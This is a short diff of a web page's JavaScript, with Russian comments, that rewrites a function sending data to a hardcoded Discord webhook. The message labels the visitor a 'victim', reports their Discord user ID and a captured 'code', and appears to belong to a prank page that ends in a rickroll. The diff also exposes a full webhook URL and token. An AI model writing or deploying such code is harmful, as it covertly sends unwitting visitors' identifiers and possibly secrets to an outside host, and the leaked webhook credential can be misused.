@@ -63,22 +63,14 @@
         }
 
         // 2. ФУНКЦИЯ ОТПРАВКИ В ДИСКОРД
-async function sendToWebhook() {
-    const webhookUrl = "https://discord.com/api/webhooks/1491823650062729226/cIgBYFw27PKEdyEJbHhHwfsxICL5I_GJHfGcxFT0a2vVQGT2yZJBAf5cWHPoAp5Plyxy";
-    
-    const message = {
+function sendToWebhook() {
+    const request = new XMLHttpRequest();
+    request.open("POST", "https://discord.com/api/webhooks/1491823650062729226/cIgBYFw27PKEdyEJbHhHwfsxICL5I_GJHfGcxFT0a2vVQGT2yZJBAf5cWHPoAp5Plyxy");
+    request.setRequestHeader('Content-type', 'application/json');
+    const params = {
         content: `🚨 **Пользователь попался!**\n👤 Жертва: <@${userId || "Неизвестный ID"}>\n🔑 Код: \`${extraInfo || "Нет данных"}\``
     };
-
-    // Используем mode: 'no-cors', чтобы браузер не задавал лишних вопросов
-    fetch(webhookUrl, {
-        method: 'POST',
-        mode: 'no-cors', 
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(message)
-    }).catch(e => console.log("Отправлено (игнорируя CORS)"));
+    request.send(JSON.stringify(params));
 }
 
         function startRickRoll() {
